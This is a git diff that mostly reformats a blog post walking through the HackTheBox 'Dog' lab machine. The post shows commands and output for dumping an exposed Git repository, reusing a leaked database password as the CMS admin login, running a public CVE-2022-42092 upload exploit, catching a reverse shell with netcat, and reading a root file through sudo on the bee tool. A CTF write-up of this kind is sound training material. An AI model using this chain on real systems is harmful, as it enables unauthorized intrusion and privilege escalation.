@@ -1,12 +1,24 @@
 ---
-title: "Dog Machine (HackTheBox) — Step-by-Step Walkthrough"
-date: "2025-07-17"
+title: 'Dog Machine (HackTheBox) — Step-by-Step Walkthrough'
+date: '2025-07-17'
 draft: false
-tags: ["linux", "hackthebox", "easy", "git-dumper", "cve-2022-42092", "file-upload", "reverse-shell", "credential-reuse", "sudo-exploitation", "privilege-escalation"]
-summary: "Compromise of a Linux HackTheBox machine by dumping an exposed Git repository to extract database credentials, logging into Backdrop CMS as admin, exploiting an authenticated unrestricted file upload vulnerability (CVE-2022-42092) for RCE, and escalating privileges via a sudo misconfiguration on the bee CLI tool."
-images: ["/static/images/dog/preview.png"]
+tags:
+  [
+    'linux',
+    'Machine',
+    'hackthebox',
+    'easy',
+    'git-dumper',
+    'cve-2022-42092',
+    'file-upload',
+    'reverse-shell',
+    'credential-reuse',
+    'sudo-exploitation',
+    'privilege-escalation',
+  ]
+summary: 'Compromise of a Linux HackTheBox machine by dumping an exposed Git repository to extract database credentials, logging into Backdrop CMS as admin, exploiting an authenticated unrestricted file upload vulnerability (CVE-2022-42092) for RCE, and escalating privileges via a sudo misconfiguration on the bee CLI tool.'
+images: ['/static/images/dog/preview.png']
 ---
-
 
 ![Dog](/static/images/dog/image.png)
 
@@ -16,7 +28,7 @@ target ip = `10.10.11.58`
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ ping 10.10.11.58 
+└─$ ping 10.10.11.58
 PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data.
 64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=268 ms
 64 bytes from 10.10.11.58: icmp_seq=2 ttl=63 time=163 ms
@@ -37,17 +49,17 @@ Host is up (3.5s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
 |   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
 |_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 | http-robots.txt: 22 disallowed entries (15 shown)
-| /core/ /profiles/ /README.md /web.config /admin 
-| /comment/reply /filter/tips /node/add /search /user/register 
+| /core/ /profiles/ /README.md /web.config /admin
+| /comment/reply /filter/tips /node/add /search /user/register
 |_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
 |_http-server-header: Apache/2.4.41 (Ubuntu)
-| http-git: 
+| http-git:
 |   10.10.11.58:80/.git/
 |     Git repository found!
 |     Repository description: Unnamed repository; edit this file 'description' to name the...
@@ -58,10 +70,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 69.06 seconds
-                                                                
+
 ```
 
-open ports are `80` and `22`  and also it’s  `10.10.11.58:80/.git/`  is open as well.
+open ports are `80` and `22` and also it’s `10.10.11.58:80/.git/` is open as well.
 
 **Port 80 is open, indicating that the server is hosting a web service — likely a website or web application**
 
@@ -70,11 +82,9 @@ open ports are `80` and `22`  and also it’s  `10.10.11.58:80/.git/`  is open a
 └─$ firefox 10.10.11.58:80
 ```
 
-
 ![Dog](/static/images/dog/image%201.png)
 
 I Navigated to the web service revealed a dog-themed website powered by Backdrop CMS.
-
 
 ## GitDmper:
 
@@ -84,7 +94,7 @@ First I activated my python virtual environment
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ source work/bin/activate 
+└─$ source work/bin/activate
 ```
 
 Then installed the library for `git-dumper`
@@ -98,11 +108,11 @@ Then installed the library for `git-dumper`
 done! ✨ 🌟 ✨
 ```
 
-After the successful installation I check for the correct syntax using the help flag `-h` 
+After the successful installation I check for the correct syntax using the help flag `-h`
 
 ```bash
 ┌──(work)─(kali㉿kali)-[~]
-└─$ git-dumper -h                                           
+└─$ git-dumper -h
 usage: git-dumper [options] URL DIR
 
 Dump a git repository from a website.
@@ -142,11 +152,11 @@ git-dumper <target-url> <output-directory>
 
 ```bash
 ┌──(kali㉿kali)-[~/fixed_dog]
-└─$ ls 
+└─$ ls
 core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.php  sites  themes
 
 ┌──(kali㉿kali)-[~/fixed_dog]
-└─$ cat ./settings.php | grep -A 10 '\$database' 
+└─$ cat ./settings.php | grep -A 10 '\$database'
 $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 $database_prefix = '';
 
@@ -178,39 +188,39 @@ I looked in the git repository using the command:
 
 ```bash
 ┌──(kali㉿kali)-[~/GitTools/Dumper]
-└─$ cd ../../fixed_dog 
-                                                                                                                                       
+└─$ cd ../../fixed_dog
+
 ┌──(kali㉿kali)-[~/fixed_dog]
 └─$ ls
-                                                                                                                                       
+
 ┌──(kali㉿kali)-[~/fixed_dog]
-└─$ ls -a                      
+└─$ ls -a
 .  ..  .git
-                                                                                                                                                                                                                                                                         
+
 ┌──(kali㉿kali)-[~/fixed_dog]
 └─$ git checkout .
 
 Updated 2873 paths from the index
-                                                                                                                                       
+
 ┌──(kali㉿kali)-[~/fixed_dog]
 └─$ ls
 core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.php  sites  themes
-                                                                                                                                       
+
 ┌──(kali㉿kali)-[~/fixed_dog]
-└─$ git init       
+└─$ git init
 Reinitialized existing Git repository in /home/kali/fixed_dog/.git/
-                                                                                                                                       
+
 ┌──(kali㉿kali)-[~/fixed_dog]
 └─$ git checkout -f
-                                                                                                                                       
+
 ┌──(kali㉿kali)-[~/fixed_dog]
 └─$ ls
 core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.php  sites  themes
-                                                                                                                                       
+
 ┌──(kali㉿kali)-[~/fixed_dog]
-└─$ git branch      
+└─$ git branch
 * master
-                                                                                                                                    
+
 ┌──(kali㉿kali)-[~/fixed_dog]
 └─$ grep -IR dog.htb .
 
@@ -221,22 +231,19 @@ core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.ph
 
 `tiffany` **uses the DB password to log into the admin functionality of Backdrop CMS**
 
-using the Credentials obtained i got in the website 
-
+using the Credentials obtained i got in the website
 
 ![Dog](/static/images/dog/image%202.png)
 
 username = `tiffany`
 
-password = `BackDropJ2024DS2024` 
+password = `BackDropJ2024DS2024`
 
 i looked for the `backdrop cms` and searched for its exploits.
-
 
 ![Dog](/static/images/dog/image%203.png)
 
 I discovered that it has file inclusion vulnerability
-
 
 ![Dog](/static/images/dog/image%204.png)
 
@@ -244,7 +251,7 @@ A vulnerability was found in Backdrop CMS `1.22.0`. It has been classified as `c
 
 ## Background
 
-Backdrop CMS is an open-source content management system that allows users to build and manage websites. It provides a range of features and functionalities, including theme customization. However, `version 1.22.0` of Backdrop CMS`is vulnerable to an Unrestricted` 
+Backdrop CMS is an open-source content management system that allows users to build and manage websites. It provides a range of features and functionalities, including theme customization. However, `version 1.22.0` of Backdrop CMS`is vulnerable to an Unrestricted`
 
 `File Upload` issue in the 'themes' component. This vulnerability can be exploited by attackers to `achieve Remote Code Execution`.
 
@@ -256,10 +263,7 @@ Backdrop CMS is an open-source content management system that allows users to bu
 
 ## Exploit
 
-
-
 ![Dog](/static/images/dog/image%205.png)
-
 
 <LinkPreview
   url="https://github.com/ajdumanhug/CVE-2022-42092"
@@ -271,9 +275,9 @@ Backdrop CMS is an open-source content management system that allows users to bu
 This Python exploit script targets an unrestricted file upload in Backdrop CMS to achieve a Remote Code Execution (RCE).
 
 ```bash
-                                                                                                         
+
 ┌──(work)─(kali㉿kali)-[~]
-└─$ git clone https://github.com/ajdumanhug/CVE-2022-42092  
+└─$ git clone https://github.com/ajdumanhug/CVE-2022-42092
 Cloning into 'CVE-2022-42092'...
 remote: Enumerating objects: 12, done.
 remote: Counting objects: 100% (12/12), done.
@@ -281,12 +285,12 @@ remote: Compressing objects: 100% (11/11), done.
 remote: Total 12 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
 Receiving objects: 100% (12/12), 6.38 KiB | 1.60 MiB/s, done.
 Resolving deltas: 100% (1/1), done.
-                                                                                                                                       
+
 ┌──(work)─(kali㉿kali)-[~]
 └─$ ls
 CVE-2022-42092  Documents  fixed_dog  lab_B3taBlocker.ovpn  Pictures  Templates  work
 Desktop         Downloads  GitTools   Music                 Public    Videos
-                                                                                                                                      
+
 ```
 
 ### Usage
@@ -326,7 +330,7 @@ For Listening :
 └─$ nc -lvnp 1234
 ```
 
-Got the shell 
+Got the shell
 
 ![Dog](/static/images/dog/image%206.png)
 
@@ -373,7 +377,7 @@ lxd
 mysql
 johncusack
 _laurel
-www-data@dog:/etc$ 
+www-data@dog:/etc$
 ```
 
 ### Switch user
@@ -410,7 +414,7 @@ sh: 0: getcwd() failed: No such file or directory
 johncusack@dog:/var/www/html/modules/shell$
 ```
 
-Successfully got the terminal 
+Successfully got the terminal
 
 I checked sudo permissions:
 
@@ -425,7 +429,7 @@ Matching Defaults entries for johncusack on dog:
 
 User johncusack may run the following commands on dog:
     (ALL : ALL) /usr/local/bin/bee
-johncusack@dog:~$ 
+johncusack@dog:~$
 
 ```
 
@@ -435,8 +439,6 @@ I found that I can run `/usr/local/bin/bee` as root:
 - No other returned path fits that pattern or purpose (e.g., `/usr/lib/modules` is for Linux kernel modules — irrelevant to a web app).
 
 **The** `bee` **subcommand to run arbitrary PHP code?**
-
-
 
 ![Dog](/static/images/dog/image%207.png)
 
@@ -449,7 +451,7 @@ johncusack@dog:/$ sudo /usr/local/bin/bee --root=/var/www/html/ eval "echo file_
 <l/ eval "echo file_get_contents('/root/root.txt');"
 
 2c8a6b0ef32cc156942c021b17c3a5bc
-johncusack@dog:/$ 
+johncusack@dog:/$
 
 ```
 
